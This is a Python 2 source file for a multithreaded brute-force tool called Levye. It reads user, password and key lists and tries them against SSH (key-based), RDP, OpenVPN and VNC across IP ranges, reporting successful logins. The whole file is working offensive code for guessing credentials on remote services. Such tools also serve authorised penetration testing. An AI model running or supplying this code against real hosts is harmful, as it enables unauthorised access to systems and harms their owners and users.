#!/usr/bin/env python

try:
	import os
	import re
	import sys
	import shlex
	import signal
	import paramiko
	import argparse
	import tempfile
	import subprocess
	from lib.threadpool import ThreadPool
	from lib.iprange import IpRange
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)



class AddressAction(argparse.Action):
  
        def __call__(self, parser, args, values, option = None):

                args.options = values

		if args.brute == "sshkey" and args.key_file is None:
			print >> sys.stderr, "Please specify key file for sshkey brute force"
			sys.exit(1)                	
		elif args.brute == "openvpn": 
			if args.config is None:
				print >> sys.stderr, "Please specify Configuration File"
				sys.exit(1)                		
			if args.passwd is None:
				print >> sys.stderr, "Please specify Passwd File"
				sys.exit(1)			
		elif args.brute == "rdp":	
			pass
		elif args.brute == "vnckey":
			pass


class Levye:
		
	def __init__(self):
		
		self.services = {"sshkey":self.sshkey,"rdp":self.rdp, "openvpn":self.openvpn, "vnckey":self.vnckey}

		self.openvpn_path = "/usr/sbin/openvpn"		
		self.vpn_failure = re.compile("SIGTERM\[soft,auth-failure\] received, process exiting")
		self.vpn_success = re.compile("Initialization Sequence Completed")
		self.xfreerdp_path = "/usr/bin/xfreerdp"
		self.rdp_success = "Authentication only, exit status 0"
		self.vncviewer_path = "/usr/bin/vncviewer"
		self.vnc_success = "Authentication successful"
		self.vnc_failure = "Authentication failed"

		description = "Description ..."
                usage = "Usage: use --help for futher information"
                parser = argparse.ArgumentParser(description = description, usage = usage)
                parser.add_argument('-b', '--brute', dest = 'brute', help = 'Brute Force Type', required = True)
		parser.add_argument('-s', '--server', dest = 'server', action = 'store', help = 'Host File', required = True)                
		parser.add_argument('-u', '--user', dest = 'username', action = 'store', help = 'User File')		
		parser.add_argument('-n', '--number', dest = 'thread', action = 'store', help = 'Thread Number', default = 5, type = int)		
		parser.add_argument('-l', '--log', dest = 'log_file', action = 'store', help = 'Log File', type = file)				
                parser.add_argument('-o', '--output', dest = 'output', action = 'store', help = 'Output Directory', type = file)		
		parser.add_argument('-c', '--passwd', dest = 'passwd', action = 'store', help = 'Password File')
		parser.add_argument('-t', '--timeout', dest = 'timeout', action = 'store', help = 'Timeout Value', default = 2, type = int)
		parser.add_argument('-p', '--port', dest = 'port', action = 'store', help = 'Service Port Number', type = int)		
		parser.add_argument('-k', '--key', dest = 'key_file', action = 'store', help = 'Key File')
		parser.add_argument('-m', '--config', dest = 'config', action = 'store', help = 'Configuration File')

		parser.add_argument('options', nargs='*', action = AddressAction)
		try:
                	self.args = parser.parse_args()
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)	

			
		if not self.args.brute in self.services.keys():
                        print >> sys.stderr, "%s is not valid service. Please use one of %s "% (self.args.brute, self.services.keys())
                        sys.exit(1)
	
		
		self.ip_list = []
		try:
			iprange = IpRange()
			for ip in iprange.iprange(self.args.server):
				self.ip_list.append(ip)
		except:
			print >> sys.stderr, "Not Valid Ip Address !!!"
			sys.exit(1)
	


	def signal_handler(self, signal, frame):

        	print('Exiting ...')
        	sys.exit(37)	


	def vnclogin(self, ip, port, passwd_file):	

		vnc_cmd = "%s -passwd %s %s:%s"% (self.vncviewer_path, passwd_file, ip, port)
		proc = subprocess.Popen(shlex.split(vnc_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		

		for line in iter(proc.stderr.readline, ''):
			if re.search(self.vnc_success, line):
				print "OK: %s:%s:%s"% (ip, port, passwd_file)
				break



	def vnckey(self, *options):
		
		port = 5900
		
		if not os.path.exists(self.vncviewer_path):
			print >> sys.stderr, "Vncviewer: %s path doesn't exists on the system !!!"% (self.vncviewer_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port
				
		if self.args.timeout is not None:
			timeout = self.args.timeout	
		
		if self.args.thread is not None:
			try:	
				pool = ThreadPool(int(self.args.thread))
			except Exception, err:
				print >> sys.stderr, err
				sys.exit(1)

		if not self.args.passwd:
			print >> sys.stderr, "Password must be specified !!!"
			sys.exit(1)

		if not os.path.isfile(self.args.passwd):
			print >> sys.stderr, "Password must be file !!!"
			sys.exit(1) 				

			
		for ip in self.ip_list:
			pool.add_task(self.vnclogin, ip, port, self.args.passwd)
					
		pool.wait_completion()


	def rdplogin(self, ip, user, password, port):
		
		rdp_cmd = "%s /sec:nla /p:%s /u:%s /port:%s /v:%s +auth-only /cert-ignore"% (self.xfreerdp_path, password, user, port, ip)
		proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		

		for line in iter(proc.stderr.readline, ''):
			if re.search(self.rdp_success, line):
				print "OK: %s:%s:%s"% (ip,user,password)
				break
		

	def rdp(self):
		
		port = 3389

		if not os.path.exists(self.xfreerdp_path):
			print >> sys.stderr, "Xfreerdp: %s path doesn't exists on the system !!!"% (self.xfreerdp_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port
				
		if self.args.timeout is not None:
			timeout = self.args.timeout	
		
		if not self.args.passwd:
			print >> sys.stderr, "Password file must be specified !!!"
			sys.exit(1)

		if self.args.thread is not None:
			try:	
				pool = ThreadPool(int(self.args.thread))
			except Exception, err:
				print >> sys.stderr, err
				sys.exit(1)


		for ip in self.ip_list:
			if os.path.isfile(self.args.username):
				for user in open(self.args.username, "r").read().splitlines():
					if os.path.isfile(self.args.passwd):			
						for password in open(self.args.passwd, "r").read().splitlines():
							pool.add_task(self.rdplogin, ip, user, password, port)
					else:
						pool.add_task(self.rdplogin, ip, user, self.args.passwd, port)
			else:
				if os.path.isfile(self.args.passwd):
					for password in open(self.args.passwd, "r").read().splitlines():
						pool.add_task(self.rdplogin, ip, self.args.username, password, port)
				else:
					pool.add_task(self.rdplogin, ip, self.args.username, self.args.passwd, port)

		pool.wait_completion()		
			


	def openvpnlogin(self, host, username, password, brute_file):

		openvpn_cmd = "%s --config %s --auth-user-pass %s"% (self.openvpn_path, self.args.config, brute_file)
		proc = subprocess.Popen(shlex.split(openvpn_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		
		for line in iter(proc.stdout.readline, ''):
			if re.search(self.vpn_success, line):
				print "OK: %s:%s:%s"% (host, username, password)
				os.kill(proc.pid, signal.SIGQUIT)


	def openvpn(self):

		port = 443

		if not os.path.exists(self.openvpn_path):
			print >> sys.stderr, "Openvpn: %s path doesn't exists on the system !!!"% (self.openvpn_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port
				
		if self.args.timeout is not None:
			timeout = self.args.timeout	
		
		if not os.path.isfile(self.args.config):
			print >> sys.stderr, "Config File %s Doesn't Exists !!!"% self.args.config
			sys.exit(1)

		if not self.args.passwd:
			print >> sys.stderr, "Password file must be specified !!!"
			sys.exit(1)

		if not self.args.username:
			print >> sys.stderr, "Username file must be specified !!!"
			sys.exit(1)


		if self.args.thread is not None:
			try:	
				pool = ThreadPool(int(self.args.thread))
			except Exception, err:
				print >> sys.stderr, err
				sys.exit(1)	


		brute_file = tempfile.NamedTemporaryFile(mode='w+t')
		brute_file_name = brute_file.name
		
		for ip in self.ip_list:
			if os.path.isfile(self.args.username):
				for user in open(self.args.username, "r").read().splitlines():
					if os.path.isfile(self.args.passwd):			
						for password in open(self.args.passwd, "r").read().splitlines():
							brute_file.write(user + "\n")
							brute_file.write(password + "\n")
							brute_file.seek(0)
							pool.add_task(self.openvpnlogin, ip, user, password, brute_file_name)
					else:
						brute_file.write(user + "\n")
						brute_file.write(self.args.passwd + "\n")
						brute_file.seek(0)
						pool.add_task(self.openvpnlogin, ip, user, self.args.passwd, brute_file_name)
			else:
				if os.path.isfile(self.args.passwd):
					for password in open(self.args.passwd, "r").read().splitlines():
						brute_file.write(self.args.username + "\n")	
						brute_file.write(password + "\n")
						brute_file.seek(0)
						pool.add_task(self.openvpnlogin, ip, self.args.username, password, brute_file_name)
				else:
					brute_file.write(self.args.username + "\n")
					brute_file.write(self.args.passwd + "\n")
					brute_file.seek(0)
					pool.add_task(self.openvpnlogin, ip, self.args.username, self.args.passwd, brute_file_name)
		
		pool.wait_completion()	
		
	
	def sshlogin(self,ip,port,user,keyfile,timeout):	
	
		ssh = paramiko.SSHClient()	
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		
		try:
			ssh.connect(ip, port, username=user, password=None, pkey=None, key_filename=keyfile, timeout=timeout, allow_agent=False, look_for_keys=False)
			print "OK: %s:%s:%s:%s:%s"% (ip,port,user,keyfile,timeout)
		except Exception ,err:
			pass
			

	def sshkey(self):

		port = 22
		
		if self.args.port is not None:
			port = self.args.port
		
		if self.args.timeout is not None:
			timeout = self.args.timeout	

		if not self.args.username:
			print >> sys.stderr, "Username file must be specified !!!"
			sys.exit(1)

		
		if self.args.thread is not None:
			try:
				pool = ThreadPool(self.args.thread)
			except Exception, err:
				print >> sys.stderr, err
				sys.exit(1)
	

		for ip in self.ip_list:
			if os.path.isfile(self.args.username):
				for user in open(self.args.username, "r").read().splitlines():
					if os.path.isdir(self.args.key_file):
						for dirname, dirnames, filenames in os.walk(self.args.key_file):
							for keyfile in filenames:
								keyfile_path = self.args.key_file + "/" + keyfile
								pool.add_task(self.sshlogin, ip, port, user, keyfile_path, timeout)
					else:
						pool.add_task(self.sshlogin, ip, port, user, self.args.key_file, timeout)
			else:
				if os.path.isdir(self.args.key_file):
					for dirname, dirnames, filenames in os.walk(self.args.key_file):
						for keyfile in filenames:
							keyfile_path = self.args.key_file + "/" + keyfile						
							pool.add_task(self.sshlogin, ip, port, self.args.username, keyfile_path, timeout)
				else:
					pool.add_task(self.sshlogin, ip, port, self.args.username, self.args.key_file, timeout)
			
		pool.wait_completion()


	def run(self, brute_type):

		signal.signal(signal.SIGINT, self.signal_handler)

		if not brute_type in self.services.keys():
			print >> sys.stderr, "%s is not valid service. Please use one of %s "% (brute_type,self.services.keys())
			sys.exit(1)
		else:
			self.services[brute_type]()		

##
### Main 
##	

if __name__ == "__main__":

	levye = Levye()
	levye.run(levye.args.brute)
